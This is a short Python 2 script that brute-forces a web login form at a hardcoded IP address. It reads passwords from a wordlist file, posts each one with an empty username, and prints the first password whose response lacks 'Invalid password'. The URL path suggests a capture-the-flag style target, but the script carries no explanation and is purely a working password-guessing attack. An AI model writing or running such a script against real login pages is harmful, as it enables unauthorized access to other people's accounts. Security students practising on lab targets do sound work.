import requests

with open("passwords.txt", 'r') as h:
	passwords_list = h.read().splitlines()


url = "http://34.74.105.127/b00daed8de/login"

for passw in passwords_list:
	req = requests.post(url, {"username": "", "password": passw})
	if "Invalid password" not in req.text:
		print "Found password: " + passw
		break